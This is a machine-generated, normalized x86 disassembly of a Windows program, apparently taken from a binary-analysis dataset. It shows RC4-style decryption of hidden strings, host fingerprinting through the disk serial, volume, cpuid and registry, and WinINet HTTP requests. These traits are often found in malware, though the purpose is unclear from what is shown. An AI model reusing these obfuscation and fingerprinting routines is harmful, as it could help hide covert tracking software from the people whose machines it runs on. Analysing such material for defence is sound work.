push ebx
call sub_40239d
sub ebp [ esp + 0x1c ]
add eax ebx
add ebp eax
push ebp
jmp r-xdata
mov ecx esi
call sub_40239d
add eax edi
jmp r-xdata
sub_40a126
push ebp
push edi
mov edi [ esp + 0xc ]
mov ebp edx
test edi edi
je r-xdata
xor eax eax
push ebx
push esi
xor esi esi
mov eax esi
mov [ eax + edi ] al
inc eax
cmp eax 0x100
jl r-xdata
mov ebx esi
lea edx [ esi + edi ]
call sub_40a11b
inc ebx
cmp ebx 0x100
jl r-xdata
dec esi
or esi 0xffffff00
inc esi
mov eax ebx
cdq
idiv ebp
lea ecx [ ebx + edi ]
movzx eax [ edx + r--data ]
movzx edx [ ecx ]
add esi eax
add esi edx
and esi 0x800000ff
jns r-xdata
pop esi
or eax 0xffffffff
pop ebx
jmp r-xdata
pop edi
pop ebp
retn
sub_40a188
push ecx
push ebx
push ebp
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
xor eax eax
mov edx esi
lea ecx [ edx + 0x1 ]
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
test edx edx
jle r-xdata
mov ecx edx
and ecx 0x80000001
jns r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
mov eax edx
cdq
sub eax edx
mov ebp eax
sar ebp 0x1
push ebp
call sub_40f24f
xor edi edi
pop ecx
mov edx eax
test ebp ebp
jle r-xdata
mov eax edx
jmp r-xdata
push 0x37
pop ebx
mov [ esp + 0x10 ] ebx
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edx
call j_sub_40f402#2
pop ecx
cmp [ esi + edi * 2 + 0x1 ] 0x41
movsx eax [ esi + edi * 2 + 0x1 ]
push 0x30
pop ecx
cmovge ecx [ esp + 0x10 ]
sub eax ecx
cmp eax 0x10
jge r-xdata
shl bl 0x4
add bl al
mov [ edi + edx ] bl
inc edi
push 0x37
pop ebx
cmp edi ebp
jl r-xdata
cmp [ esi + edi * 2 ] 0x41
push 0x30
pop ecx
cmovge ecx ebx
movsx ebx [ esi + edi * 2 ]
sub ebx ecx
cmp ebx 0x10
jge r-xdata
sub_40a22a
sub esp 0xc
push ebx
push ebp
push esi
mov esi ecx
mov ebx edx
push edi
mov [ esp + 0x18 ] ebx
test esi esi
je r-xdata
xor eax eax
mov edi [ esp + 0x28 ]
test edi edi
je r-xdata
push 0x100
call sub_40f24f
mov edx [ esp + 0x28 ]
mov ebp eax
push ebp
call sub_40a126
pop ecx
pop ecx
test eax eax
je r-xdata
xor edx edx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x2c ]
push ebp
mov [ eax ] ebx
call j_sub_40f402#2
pop ecx
or eax 0xffffffff
jmp r-xdata
sub esi edi
mov [ esp + 0x10 ] ebx
xor ebx ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
lea ecx [ ebx + ebp ]
movzx eax [ ecx ]
add eax edx
and eax 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
lea edx [ eax + ebp ]
mov [ esp + 0x14 ] eax
call sub_40a11b
movzx ecx [ ecx ]
movzx eax [ edx ]
add ecx eax
and ecx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov al [ ecx + ebp ]
xor al [ esi + edi ]
mov edx [ esp + 0x14 ]
mov [ edi ] al
inc edi
dec [ esp + 0x10 ]
jne r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
inc ebx
and ebx 0x800000ff
jns r-xdata
mov ebx [ esp + 0x18 ]
sub_40a2f9
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
xor eax eax
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
test cl 0x1
jne r-xdata
mov ecx esi
call sub_40a188
mov edx esi
mov ebx eax
lea eax [ edx + 0x1 ]
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx eax
shr edx 0x1
inc edx
push edx
call sub_40f24f
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx esi
mov edi eax
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
shr ecx 0x1
inc ecx
push ecx
push 0x0
push edi
call sub_414c70
add esp 0xc
lea ecx [ esi + 0x1 ]
mov al [ esi ]
inc esi
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
sub esi ecx
push edi
push 0x100
push ecx
shr esi 0x1
mov edx esi
mov ecx ebx
call sub_40a22a
add esp 0x10
push ebx
test eax eax
jne r-xdata
call j_sub_40f402#2
mov eax [ ebp - 0x4 ]
pop ecx
mov [ eax + edi ] 0x0
mov eax edi
jmp r-xdata
call j_sub_40f402#2
push edi
call j_sub_40f402#2
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40a3c8
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
xor eax eax
mov [ ebp - 0x8 ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
sub_40a431
sub esp 0x10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc ] eax
push ebx
push ebp
push esi
mov esi [ GlobalAlloc@IAT ]
push edi
push 0x20
push 0x40
mov [ esp + 0x1c ] edx
mov ebx ecx
call esi
push 0x210
mov edi eax
push 0x40
mov [ esp + 0x18 ] edi
call esi
and [ edi ] 0x0
push 0x0
mov ebp eax
lea eax [ esp + 0x1c ]
push eax
push 0x210
push ebp
push 0x20
push edi
push 0x7c088
mov [ edi + 0xa ] 0xec
push ebx
mov [ ebp ] 0x200
call [ DeviceIoControl@IAT ]
mov edi [ esp + 0x14 ]
lea esi [ ebp + 0x10 ]
mov ecx 0x80
[ edi ] [ esi ]
mov esi [ GlobalFree@IAT ]
push ebp
mov ebx eax
call esi
push [ esp + 0x10 ]
call esi
mov ecx [ esp + 0x1c ]
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x10
retn
sub_40a4c4
push esi
mov esi edx
push edi
mov edi ecx
test esi esi
jle r-xdata
xor ecx ecx
test esi esi
jle r-xdata
lea edx [ esi - 0x1 ]
shr edx 0x1
push ebx
lea ebx [ edi + 0x1 ]
inc edx
mov eax esi
sub eax ecx
push eax
lea eax [ ecx + edi ]
push eax
push edi
call sub_40ebc0
add esp 0xc
jmp r-xdata
cmp [ ecx + edi ] 0x20
jne r-xdata
mov cl [ ebx - 0x1 ]
mov al [ ebx ]
mov [ ebx - 0x1 ] al
mov [ ebx ] cl
lea ebx [ ebx + 0x2 ]
dec edx
jne r-xdata
pop ebx
dec esi
jns r-xdata
inc ecx
cmp ecx esi
jl r-xdata
cmp [ esi + edi ] 0x20
jne r-xdata
pop edi
pop esi
retn
mov [ esi + edi ] 0x0
sub_40a51e
push 0xffffffff
push sub_41dfb6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi edx
mov edi ecx
mov [ esp + 0x18 ] edi
mov eax [ esp + 0x54 ]
mov ebx [ esp + 0x50 ]
xor ebp ebp
mov ecx esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ebp
call sub_40228d
test eax eax
je r-xdata
push esi
mov ecx edi
call sub_40acb2
mov ecx ebx
call sub_40228d
test eax eax
je r-xdata
push esi
lea ecx [ esp + 0x28 ]
call sub_40acb2
push ebp
push ebx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x50 ] ebp
call sub_40ad02
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
lea eax [ esp + 0x24 ]
push eax
mov ecx edi
call sub_4020e0
lea ecx [ esp + 0x24 ]
call sub_40211d
jmp r-xdata
mov edi [ esp + 0x1c ]
mov eax edi
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_40eb9e
add esp 0x38
retn
mov ecx edi
call sub_40228d
push edi
mov ecx ebx
lea esi [ eax + ebp ]
call sub_40228d
push eax
push ebp
lea ecx [ esp + 0x30 ]
call sub_40acea
push esi
push ebx
lea ecx [ esp + 0x2c ]
call sub_40ad02
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov edi [ esp + 0x18 ]
sub_40a617
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
push edi
mov edi ecx
mov [ ebp - 0x20 ] esi
test edx edx
jne r-xdata
push edx
lea ecx [ ebp - 0x1c ]
call sub_4020ad
lea ecx [ ebp - 0x1c ]
call sub_40228d
test eax eax
je r-xdata
push r--data
call sub_4020ad
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
call sub_4020e0
lea ecx [ ebp - 0x1c ]
call sub_40211d
push esi
lea ecx [ ebp - 0x1c ]
call sub_40983c
movsx cx [ eax ]
movzx ecx cx
cmp ecx 0x30
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
cmp ecx 0x41
jb r-xdata
cmp ecx 0x39
jbe r-xdata
cmp ecx 0x61
jb r-xdata
cmp ecx 0x5a
jbe r-xdata
lea ecx [ ebp - 0x1c ]
inc esi
call sub_40228d
cmp esi eax
jb r-xdata
cmp ecx 0x2d
je r-xdata
cmp ecx 0x7a
jbe r-xdata
mov [ eax ] 0x58
sub_40a6bb
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push 0x0
lea eax [ ebp - 0x2c ]
push r--data
push eax
mov ebx edx
call [ wsprintfW@IAT ]
add esp 0xc
lea ecx [ ebp - 0x2c ]
call sub_40a41b
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
mov edx ebx
mov ecx esi
call sub_40a431
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
push 0x14
lea ecx [ ebx + 0x14 ]
pop edx
call sub_40a4c4
push 0x28
lea ecx [ ebx + 0x36 ]
pop edx
call sub_40a4c4
push 0x8
lea ecx [ ebx + 0x2e ]
pop edx
call sub_40a4c4
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
sub_40a73f
sub esp 0x10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc ] eax
push ebx
mov ebx [ esp + 0x1c ]
xor eax eax
push edi
inc eax
xor edi edi
mov [ esp + 0x8 ] edi
mov [ esp + 0xc ] 0x208
mov [ esp + 0x10 ] eax
call sub_40a3c8
test eax eax
lea eax [ esp + 0x8 ]
je r-xdata
push eax
push 0x20019
push edi
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
push ebp
push eax
push 0x20219
push edi
push r--data
mov ebp 0x80000002
push ebp
call [ RegOpenKeyExW@IAT ]
lea eax [ esp + 0xc ]
push eax
push 0x20219
push edi
push r--data
push ebp
call [ RegOpenKeyExW@IAT ]
pop ebp
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
lea eax [ esp + 0xc ]
push eax
push ebx
lea eax [ esp + 0x18 ]
push eax
push edi
push r--data
push [ esp + 0x1c ]
call [ RegQueryValueExW@IAT ]
test eax eax
push 0x1
pop eax
cmove edi eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov eax edi
pop edi
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x10
retn
push [ esp + 0x8 ]
call [ RegCloseKey@IAT ]
sub_40a816
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi ecx
mov eax 0x1
xor edx edx
cpuid
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push r--data
push 0x208
push esi
call sub_40f63a
xor eax eax
add esp 0x14
inc eax
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_40a866
push 0xffffffff
push sub_41df80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6bc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x6b8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x6d0 ]
mov [ fs : 0x0 ] eax
mov ebp ecx
mov [ esp + 0x34 ] ebp
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0x6c ]
call sub_40a6bb
push 0x2
pop ebx
test eax eax
je r-xdata
mov edi rw-data
mov edx edi
xor ecx ecx
lea esi [ edx + 0x2 ]
push 0x9
pop ecx
xor eax eax
mov [ esp + 0x294 ] ax
lea edi [ esp + 0x296 ]
[ edi ]
stosw [ edi ]
push 0x9
pop ecx
xor eax eax
mov [ esp + 0x26c ] ax
lea edi [ esp + 0x26e ]
[ edi ]
stosw [ edi ]
mov ecx 0xff
push ecx
lea eax [ esp + 0x270 ]
push eax
lea eax [ esp + 0x3c ]
push eax
lea eax [ esp + 0x74 ]
push eax
lea eax [ esp + 0x40 ]
push eax
push ecx
lea eax [ esp + 0x2ac ]
push eax
xor edi edi
push edi
call [ GetVolumeInformationW@IAT ]
xor eax eax
push 0x40e
mov [ esp + 0x2c0 ] ax
lea eax [ esp + 0x2c2 ]
push edi
push eax
call sub_414c70
add esp 0xc
lea ecx [ esp + 0x2bc ]
call sub_40a816
test eax eax
jne r-xdata
lea eax [ esp + 0x80 ]
push eax
lea ecx [ esp + 0x3c ]
call sub_4020ad
mov edi r--data
xor ebx ebx
push edi
lea ecx [ esp + 0x298 ]
mov [ esp + 0x6dc ] ebx
call sub_4020ad
mov esi r--data
push esi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x6dc ] 0x1
call sub_4020ad
lea eax [ esp + 0x294 ]
push eax
lea eax [ esp + 0x1c ]
push eax
lea edx [ esp + 0x40 ]
lea ecx [ esp + 0x274 ]
mov [ esp + 0x6e0 ] 0x2
call sub_40a51e
pop ecx
pop ecx
push eax
lea ecx [ esp + 0x3c ]
call sub_4097be
lea ecx [ esp + 0x26c ]
call sub_40211d
lea ecx [ esp + 0x18 ]
call sub_40211d
lea ecx [ esp + 0x294 ]
mov [ esp + 0x6d8 ] bl
call sub_40211d
lea eax [ esp + 0xa2 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_4020ad
push edi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x6dc ] 0x3
call sub_4020ad
push esi
lea ecx [ esp + 0x298 ]
mov [ esp + 0x6dc ] 0x4
call sub_4020ad
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x298 ]
push eax
lea edx [ esp + 0x58 ]
lea ecx [ esp + 0x274 ]
mov [ esp + 0x6e0 ] 0x5
call sub_40a51e
pop ecx
pop ecx
push eax
lea ecx [ esp + 0x54 ]
call sub_4097be
lea ecx [ esp + 0x26c ]
call sub_40211d
lea ecx [ esp + 0x294 ]
call sub_40211d
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6d8 ] 0x3
call sub_40211d
lea ecx [ esp + 0x38 ]
call j_sub_40239d#2
mov edx eax
lea ecx [ esp + 0x26c ]
call sub_40a617
push eax
lea ecx [ esp + 0x3c ]
call sub_4097be
lea ecx [ esp + 0x26c ]
call sub_40211d
lea ecx [ esp + 0x50 ]
call j_sub_40239d#2
mov edx eax
lea ecx [ esp + 0x26c ]
call sub_40a617
push eax
lea ecx [ esp + 0x54 ]
call sub_4097be
lea ecx [ esp + 0x26c ]
call sub_40211d
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x44 ]
call j_sub_40239d#2
mov ebp [ MultiByteToWideChar@IAT ]
push eax
push ebx
push 0xfde9
call ebp
mov edi eax
xor ecx ecx
push 0x2
lea esi [ edi + 0x1 ]
pop edx
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40eb95
pop ecx
push esi
mov ebx eax
xor esi esi
push esi
push ebx
mov [ esp + 0x3c ] ebx
call sub_414c70
add esp 0xc
lea ecx [ esp + 0x38 ]
push edi
push ebx
push edi
call j_sub_40239d#2
push eax
push esi
mov ebx 0xfde9
push ebx
call ebp
push esi
push esi
push 0xffffffff
lea ecx [ esp + 0x5c ]
call j_sub_40239d#2
push eax
push esi
push ebx
call ebp
mov edi eax
xor ecx ecx
push 0x2
lea esi [ edi + 0x1 ]
pop edx
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40eb95
pop ecx
push esi
xor ecx ecx
mov ebx eax
push ecx
push ebx
call sub_414c70
add esp 0xc
lea ecx [ esp + 0x50 ]
push edi
push ebx
push edi
call j_sub_40239d#2
push eax
xor edi edi
push edi
push 0xfde9
call ebp
mov ebp [ esp + 0x34 ]
push 0x618
push edi
push ebp
call sub_414c70
mov esi [ esp + 0x3c ]
add esp 0xc
push esi
push ebx
push r--data
push 0x30c
push ebp
call sub_40f63a
add esp 0x14
push ebx
call j_sub_40f402
pop ecx
push esi
call j_sub_40f402
pop ecx
lea ecx [ esp + 0x50 ]
call sub_40211d
lea ecx [ esp + 0x38 ]
call sub_40211d
push 0x2
pop ebx
jmp r-xdata
mov ax [ edx ]
add edx 0x2
cmp ax cx
jne r-xdata
sub edx esi
sar edx 0x1
push edx
push edi
push 0x30c
push ebp
call sub_40ff6d
add esp 0x10
xor eax eax
mov [ ebp + 0x616 ] ax
jmp r-xdata
push 0x618
push edi
push ebp
call sub_414c70
add esp 0xc
lea eax [ esp + 0x2bc ]
push [ esp + 0x30 ]
push eax
push r--data
push 0x30c
push ebp
call sub_40f63a
add esp 0x14
lea ecx [ esp + 0x2bc ]
call sub_40a80a
mov ecx ebp
lea edx [ ecx + 0x2 ]
mov al 0x1
mov ecx [ esp + 0x6d0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x6b8 ]
xor ecx esp
call sub_40eb9e
add esp 0x6c8
retn
mov ax [ ecx ]
add ecx ebx
cmp ax di
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push ebp
push 0x104
push rw-data
call sub_40ff6d
add esp 0x10
xor ecx ecx
mov [ rw-data ] cx
sub_40acb2
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x1 ]
push eax
mov esi ecx
call sub_402396
push eax
mov ecx esi
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_402327
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call sub_40298f
mov eax esi
pop esi
leave
retn 0x4
sub_40ad02
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
call sub_40228d
mov ecx [ esp + 0x8 ]
push eax
push [ esp + 0x10 ]
call sub_40239d
push eax
mov ecx esi
call sub_40ad28
pop esi
retn 0x8
sub_40ad28
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov ebx ecx
test ebp ebp
jne r-xdata
push esi
mov esi [ ebx + 0x10 ]
cmp edi esi
jae r-xdata
cmp edi [ ebx + 0x10 ]
ja r-xdata
or eax 0xffffffff
sub esi edi
cmp ebp esi
ja r-xdata
mov eax edi
jmp r-xdata
xor eax eax
inc eax
sub eax ebp
add esi eax
call sub_40239d
add eax edi
jmp r-xdata
pop edi
pop ebp
pop ebx
retn 0xc
push [ esp + 0x14 ]
mov edx esi
mov ecx eax
mov [ esp + 0x20 ] eax
call sub_40a3ae
mov edi eax
pop ecx
test edi edi
jne r-xdata
mov edx [ esp + 0x14 ]
push ebp
mov ecx edi
call sub_408a8a
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_40239d
sub edi eax
mov eax edi
jmp r-xdata
mov eax [ esp + 0x1c ]
sub eax edi
dec eax
add esi eax
lea eax [ edi + 0x1 ]
pop esi
sub_40adea
push 0x4
mov eax sub_41dff9
call sub_411378
mov esi ecx
mov [ ebp - 0x10 ] esi
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_402127
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x2
call sub_402127
xor eax eax
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
call sub_40223f
lea ecx [ ebp + 0x20 ]
call sub_40223f
mov eax esi
call sub_411346
retn 0x30
sub_40ae71
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x1c ]
mov [ esi ] r--data
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea ecx [ esi + 0x1c ]
call sub_40223f
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_40223f
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40aeb3
push ebp
sub esp 0x428
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x428 ] eax
push 0x98
mov eax sub_41e064
call sub_4113e1
mov esi ecx
lea edi [ esi + 0x4 ]
mov ecx edi
mov [ ebp - 0x64 ] esi
call sub_402291
test al al
je r-xdata
mov ebx 0x208
push ebx
lea eax [ ebp + 0x220 ]
push 0x0
push eax
call sub_414c70
push ebx
lea eax [ ebp + 0x18 ]
push 0x0
push eax
call sub_414c70
push 0x3c
pop ebx
push ebx
lea eax [ ebp - 0x4c ]
push 0x0
push eax
call sub_414c70
lea eax [ ebp + 0x220 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp + 0x18 ]
add esp 0x24
mov [ ebp - 0x20 ] eax
mov ecx 0x103
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4c ] ebx
xor ebx ebx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x1c ] ecx
push 0x80000000
mov ecx edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
call sub_40228d
push eax
mov ecx edi
call j_sub_402624
push eax
call [ InternetCrackUrlW@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] ebx
call sub_40b224
lea ecx [ ebp - 0x50 ]
call sub_40adac
push r--data
push ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x1
call sub_40adc7
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x428 ]
xor ecx ebp
call sub_40eb9e
add ebp 0x42c
leave
retn
push ebx
push ebx
push ebx
push ebx
push r--data
call eax
mov [ esi + 0x34 ] eax
test eax eax
jne r-xdata
lea ecx [ ebp - 0x50 ]
call sub_40adb2
jmp r-xdata
push ecx
lea ecx [ ebp - 0x54 ]
call sub_40b224
lea ecx [ ebp - 0x54 ]
call sub_40adac
push r--data
push ecx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_40adc7
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp + 0x14 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x74 ]
push ebx
push ebx
push 0x3
mov ecx r--data
push ecx
push ecx
push ebx
lea ecx [ ebp + 0x220 ]
push ecx
push [ esi + 0x34 ]
call eax
mov [ esi + 0x38 ] eax
test eax eax
jne r-xdata
lea ecx [ ebp - 0x54 ]
call sub_40adb2
jmp r-xdata
push ecx
lea ecx [ ebp - 0x58 ]
call sub_40b224
lea ecx [ ebp - 0x58 ]
call sub_40adac
push r--data
push ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x3
call sub_40adc7
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x8c ]
mov [ ebp + 0x14 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x8c ]
jmp r-xdata
push ebx
push 0x80000100
push ebx
push ebx
push r--data
lea ecx [ ebp + 0x18 ]
push ecx
push r--data
push [ esi + 0x38 ]
call eax
mov [ esi + 0x3c ] eax
test eax eax
jne r-xdata
lea ecx [ ebp - 0x58 ]
call sub_40adb2
jmp r-xdata
push eax
call sub_4112eb
push ecx
lea ecx [ ebp - 0x5c ]
call sub_40b224
lea ecx [ ebp - 0x5c ]
call sub_40adac
push r--data
push ecx
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x4
call sub_40adc7
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp + 0x14 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0xa4 ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push [ esi + 0x3c ]
call eax
test eax eax
jne r-xdata
lea ecx [ ebp - 0x5c ]
call sub_40adb2
jmp r-xdata
push ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x10 ] 0x4
call sub_40b224
lea ecx [ ebp - 0x60 ]
call sub_40adac
push r--data
push ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x5
call sub_40adc7
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x98 ]
mov [ ebp + 0x14 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x98 ]
jmp r-xdata
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x20000013
push [ esi + 0x3c ]
call eax
test eax eax
jne r-xdata
lea ecx [ ebp - 0x60 ]
call sub_40adb2
jmp r-xdata
cmp [ ebp + 0x14 ] 0x12c
lea ecx [ ebp - 0x60 ]
sbb esi esi
neg esi
call sub_40adb2
lea ecx [ ebp - 0x5c ]
call sub_40adb2
lea ecx [ ebp - 0x58 ]
call sub_40adb2
lea ecx [ ebp - 0x54 ]
call sub_40adb2
lea ecx [ ebp - 0x50 ]
call sub_40adb2
jmp r-xdata
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x68 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x80 ]
jmp r-xdata
mov eax esi
sub_40b22a
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
mov edi [ InternetCloseHandle@IAT ]
je r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call edi
and [ esi + 0x3c ] 0x0
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x38 ]
call edi
and [ esi + 0x38 ] 0x0
pop edi
pop esi
retn
push [ esi + 0x34 ]
call edi
and [ esi + 0x34 ] 0x0
sub_40b264
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
xor eax eax
cmp [ edi + 0x3c ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40eb9e
leave
retn
push esi
push 0x3e
mov [ ebp - 0x44 ] ax
xor esi esi
lea eax [ ebp - 0x42 ]
push esi
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x5
push [ edi + 0x3c ]
mov [ ebp - 0x48 ] 0x40
mov [ ebp - 0x4c ] esi
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x40 ] esi
lea eax [ ebp - 0x44 ]
push eax
call sub_40f65f
pop ecx
mov [ edi + 0x40 ] eax
inc esi
jmp r-xdata
mov eax esi
pop esi
sub_40b2f5
push ebp
sub esp 0x818
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x818 ] eax
push 0x8
mov eax sub_41e014
call sub_4113e1
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_40aeb3
mov ecx esi
test eax eax
jne r-xdata
call sub_40b264
test eax eax
jne r-xdata
call sub_40b22a
lea ecx [ esi + 0x1c ]
call sub_402291
test al al
jne r-xdata
mov ecx esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x818 ]
xor ecx ebp
